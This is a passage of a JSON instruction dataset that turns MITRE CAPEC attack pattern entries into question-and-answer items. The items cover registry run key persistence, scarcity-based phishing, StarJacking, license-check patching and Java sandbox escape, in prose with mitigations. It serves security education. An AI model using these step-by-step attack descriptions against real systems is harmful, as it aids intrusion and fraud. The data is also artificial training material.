        "Description": "An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Prerequisites": {
          "Prerequisite": "Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system."
        },
        "Resources_Required": {
          "Resource": "The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Other",
              "Note": "Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Employ robust cybersecurity training for all employees.",
            "Implement system antivirus software that scans all attachments before opening them.",
            "Regularly patch all software.",
            "Execute all suspicious files in a sandbox environment."
          ]
        },
        "Example_Instances": {
          "Example": "BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "829"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Modification of Registry Run Keys (CAPEC ID: 270), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An adversary can place a malicious executable (RAT) on the target system and then configure it to automatically run when the user logs in to maintain persistence on the target system.\nThrough the modification of registry \"run keys\" the adversary can masquerade a malicious executable as a legitimate program.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary can place a malicious executable (RAT) on the target system and then configure it to automatically run when the user logs in to maintain persistence on the target system.",
        "Through the modification of registry \"run keys\" the adversary can masquerade a malicious executable as a legitimate program."
      ],
      "@Name": "Modification of Registry Run Keys (CAPEC ID: 270)",
      "attack_ptrn": {
        "@ID": "270",
        "@Name": "Modification of Registry Run Keys",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary adds a new entry to the \"run keys\" in the Windows registry so that an application of their choosing is executed when a user logs in. In this way, the adversary can get their executable to operate and run on the target system with the authorized user's level of permissions. This attack is a good way for an adversary to run persistent spyware on a user's machine, such as a keylogger.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "203"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "568"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "529"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "646"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "555"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine target system] The adversary must first determine the system they wish to target. This attack only works on Windows."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Gain access to the system] The adversary needs to gain access to the system in some way so that they can modify the Windows registry.",
              "Technique": [
                "Gain physical access to a system either through shoulder surfing a password or accessing a system that is left unlocked.",
                "Gain remote access to a system through a variety of means."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Modify Windows registry] The adversary will modify the Windows registry by adding a new entry to the \"run keys\" referencing a desired program. This program will be run whenever the user logs in."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have gained access to the target system via physical or logical means in order to carry out this attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": [
              "Modify Data",
              "Gain Privileges"
            ]
          }
        },
        "Mitigations": {
          "Mitigation": "Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist."
        },
        "Example_Instances": {
          "Example": [
            "An adversary can place a malicious executable (RAT) on the target system and then configure it to automatically run when the user logs in to maintain persistence on the target system.",
            "Through the modification of registry \"run keys\" the adversary can masquerade a malicious executable as a legitimate program."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "15"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1547.001",
              "Entry_Name": "Boot or Logon Autostart Execution: Registry Run Keys / Start Folder"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1547.014",
              "Entry_Name": "Boot or Logon Autostart Execution: Active"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Mitigations, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Influence Perception of Scarcity (CAPEC ID: 420), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An adversary sends an email to a target about a limited-time opportunity to claim a considerable monetary reward. The email contains a link to a site which the adversary says is only active for a short time and to the first person to claim it. By convincing the user of the scarcity of the monetary reward, the adversary aims to persuade them to click on the malicious link in the email.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary sends an email to a target about a limited-time opportunity to claim a considerable monetary reward. The email contains a link to a site which the adversary says is only active for a short time and to the first person to claim it. By convincing the user of the scarcity of the monetary reward, the adversary aims to persuade them to click on the malicious link in the email.",
      "@Name": "Influence Perception of Scarcity (CAPEC ID: 420)",
      "attack_ptrn": {
        "@ID": "420",
        "@Name": "Influence Perception of Scarcity",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "The adversary leverages a perception of scarcity to persuade the target to perform an action or divulge information that is advantageous to the adversary. By conveying a perception of scarcity, or a situation of limited supply, the adversary aims to create a sense of urgency in the context of a target's decision-making process.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "417"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have the means and knowledge of how to communicate with the target in some manner."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary requires strong inter-personal and communication skills."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Other",
            "Note": "Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system."
          }
        },
        "Mitigations": {
          "Mitigation": "An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks."
        },
        "Example_Instances": {
          "Example": "An adversary sends an email to a target about a limited-time opportunity to claim a considerable monetary reward. The email contains a link to a site which the adversary says is only active for a short time and to the first person to claim it. By convincing the user of the scarcity of the monetary reward, the adversary aims to persuade them to click on the malicious link in the email."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-348"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-08-04",
            "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, References, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
          },
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Target Influence via Perception of Scarcity"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: StarJacking (CAPEC ID: 693)",
    "context": "",
    "output": "Possible examples: In April 2022, Checkmarx reported that packages hosted on NPM, PyPi, and Yarn do not properly validate that the provided GitHub repository URL actually pertains to the package being provided. Combined with additional attacks such as TypoSquatting, this allows adversaries to spoof popularity metadata by associating popular GitHub repository URLs with the malicious package. This can further lead to developers unintentionally including the malicious package within their development environments [REF-721].",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "In April 2022, Checkmarx reported that packages hosted on NPM, PyPi, and Yarn do not properly validate that the provided GitHub repository URL actually pertains to the package being provided. Combined with additional attacks such as TypoSquatting, this allows adversaries to spoof popularity metadata by associating popular GitHub repository URLs with the malicious package. This can further lead to developers unintentionally including the malicious package within their development environments [REF-721].",
      "@Name": "StarJacking (CAPEC ID: 693)",
      "attack_ptrn": {
        "@ID": "693",
        "@Name": "StarJacking",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary spoofs software popularity metadata to deceive users into believing that a maliciously provided package is widely used and originates from a trusted source."
        },
        "Extended_Description": {
          "xhtml:p": "Many open-source software packages are hosted via third-party package managers (e.g., Node Package Manager, PyPi, Yarn, etc.) that allow for easy integration of software components into existing development environments. A package manager will typically include various metadata about the software and often include a link to the package's source code repository, to assist developers in determining the trustworthiness of the software. One common statistic used in this decision-making process is the popularity of the package. This entails checking the amount of \"Stars\" the package has received, which the package manager displays based on the provided source code repository URL. However, many package managers do not validate the connection between the package and source code repository being provided. Adversaries can thus spoof the popularity statistic of a malicious package by associating a popular source code repository URL with the package. This can ultimately trick developers into unintentionally incorporating the malicious package into their development environment."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "691"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target] The adversary must first identify a target package whose popularity statistics will be leveraged. This will be a popular and widely used package, as to increase the perceived pedigree of the malicious package."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Spoof package popularity] The adversary provides their malicious package to a package manager and uses the source code repository URL identified in Step 1 to spoof the popularity of the package. This malicious package may also closely resemble the legitimate package whose statistics are being utilized."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Exploit victims] The adversary infiltrates development environments with the goal of conducting additional attacks.",
              "Technique": [
                "Active: The adversary attempts to trick victims into downloading the malicious package by means such as phishing and social engineering.",
                "Passive: The adversary waits for victims to download and leverage the malicious package."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Identification of a popular open-source package whose popularity metadata is to be used for the malicious package."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Ability to provide a package to a package manager and associate a popular package's source code repository URL."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Accountability",
              "Impact": "Hide Activities"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Execute Unauthorized Commands",
                "Alter Execution Logic",
                "Gain Privileges"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Before downloading open-source packages, perform precursory metadata checks to determine the author(s), frequency of updates, when the software was last updated, and if the software is widely leveraged.",
            "Look for conflicting or non-unique repository references to determine if multiple packages share the same repository reference.",
            "Reference vulnerability databases to determine if the software contains known vulnerabilities.",
            "Only download open-source packages from reputable package managers.",
            "After downloading open-source packages, ensure integrity values have not changed.",
            "Before executing or incorporating the package, leverage automated testing techniques (e.g., static and dynamic analysis) to determine if the software behaves maliciously."
          ]
        },
        "Example_Instances": {
          "Example": "In April 2022, Checkmarx reported that packages hosted on NPM, PyPi, and Yarn do not properly validate that the provided GitHub repository URL actually pertains to the package being provided. Combined with additional attacks such as TypoSquatting, this allows adversaries to spoof popularity metadata by associating popular GitHub repository URLs with the malicious package. This can further lead to developers unintentionally including the malicious package within their development environments [REF-721]."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-721"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2022-09-29"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Removing Important Client Functionality (CAPEC ID: 207)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Removing Important Client Functionality (CAPEC ID: 207) are: The adversary reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the adversary simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.\nThe adversary uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the adversary directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The adversary reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the adversary simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.",
        "The adversary uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the adversary directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks)."
      ],
      "@Name": "Removing Important Client Functionality (CAPEC ID: 207)",
      "attack_ptrn": {
        "@ID": "207",
        "@Name": "Removing Important Client Functionality",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary removes or disables functionality on the client that the server assumes to be present and trustworthy.",
        "Extended_Description": {
          "xhtml:p": "Adversaries can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an adversary can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "22",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Probing] The adversary probes, through brute-forcing, reverse-engineering or other similar means, the functionality on the client that server assumes to be present and trustworthy.",
              "Technique": [
                "The adversary probes by exploring an application's functionality and its underlying mapping to server-side components.",
                "The adversary reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine which functionality to disable or remove] The adversary tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.",
              "Technique": "The adversary reverse engineers the client-side code to determine which functionality to disable or remove."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Disable or remove the critical functionality from the client code] Once the functionality has been determined, the adversary disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.",
              "Technique": "The adversary disables or removes the functionality from the client-side code to perform malicious actions, such as sending of dangerous content (such as scripts) to the server."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "To reverse engineer the client-side code to disable/remove the functionality on the client that the server relies on."
            },
            {
              "@Level": "Low",
              "#text": "The adversary installs a web tool that allows scripts or the DOM model of web-based applications to be modified before they are executed in a browser. GreaseMonkey and Firebug are two examples of such tools."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have access to a client and be able to modify the client behavior, often through reverse engineering. If the server is assuming specific client functionality, this usually means the server only recognizes a specific client application, rather than a broad class of client applications. Reverse engineering tools would likely be necessary."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other",
              "Note": "Information Leakage"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.",
            "Design: Ship client-side application with integrity checks (code signing) when possible.",
            "Design: Use obfuscation and other techniques to prevent reverse engineering the client code."
          ]
        },
        "Example_Instances": {
          "Example": [
            "The adversary reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the adversary simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.",
            "The adversary uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the adversary directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks)."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "602"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-75",
              "@Section": "Greasemonkey"
            },
            {
              "@External_Reference_ID": "REF-76"
            },
            {
              "@External_Reference_ID": "REF-77",
              "@Section": "Greasemonkey"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Extended_Description, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Removing Important Functionality from the Client"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Reverse Engineering (CAPEC ID: 188)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.",
      "@Name": "Reverse Engineering (CAPEC ID: 188)",
      "attack_ptrn": {
        "@ID": "188",
        "@Name": "Reverse Engineering",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or \"back engineer\" some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Low",
        "Prerequisites": {
          "Prerequisite": "Access to targeted system, resources, and information."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Understanding of low level programming languages or technologies can be very helpful. For example, when reverse engineering a binary file, an understanding of assembly languages can help to determine the purpose and inner-workings of the code. Another example is reverse engineering an application that relies on networking. Here, an understanding networking protocols can provide insight into application details."
          }
        },
        "Resources_Required": {
          "Resource": "The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed."
        },
        "Mitigations": {
          "Mitigation": "Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity."
        },
        "Example_Instances": {
          "Example": "When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1278"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-50",
            "@Section": "Reverse engineering"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Escaping a Sandbox by Calling Code in Another Language (CAPEC ID: 237)",
    "context": "",
    "output": "Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named \"msits.exe\", located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named \"msits.exe\", located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.",
      "@Name": "Escaping a Sandbox by Calling Code in Another Language (CAPEC ID: 237)",
      "attack_ptrn": {
        "@ID": "237",
        "@Name": "Escaping a Sandbox by Calling Code in Another Language",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "The attacker may submit malicious code of another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "480"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Probing] The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.",
              "Technique": "The attacker probes the target application to see whether calling code of another language is allowed within a sandbox."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.",
              "Technique": "The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Verify the exploitable security weaknesses] The attacker tries to craft malicious code of another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.",
              "Technique": "The attacker tries to explore the security weaknesses by calling malicious code of another language allowed by the sandbox."
            },
            {
              "Step": "4",
